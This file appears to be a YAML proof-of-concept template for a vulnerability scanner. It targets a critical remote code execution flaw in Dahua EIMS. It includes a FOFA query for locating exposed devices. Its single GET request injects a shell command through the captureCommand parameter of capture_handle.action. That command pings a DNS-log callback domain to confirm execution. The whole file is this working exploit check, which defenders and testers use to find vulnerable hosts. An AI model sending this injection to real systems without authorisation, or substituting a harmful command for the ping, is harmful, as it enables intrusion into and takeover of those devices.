id: poc-yaml-dahua-eims-capture-handle-rce
info:
  name: 大华 EIMS capture_handle 远程代码执行漏洞
  severity: critical
  tags:
  - DNSLOG
  - rce
  finger: 大华 EIMS
  fofa: title="EIMS"
variables:
  reverse: new_dns_log()
  domain: reverse.Domain()
requests:
- method: GET
  path: /config/asst/system_setPassWordValidate.action/capture_handle.action?captureFlag=true&captureCommand=ping%20{{.domain}}%20index.pcap
  expression: 'status_code == 200 &&

    body == "success" &&

    reverse.Verify()

    '
transport: http
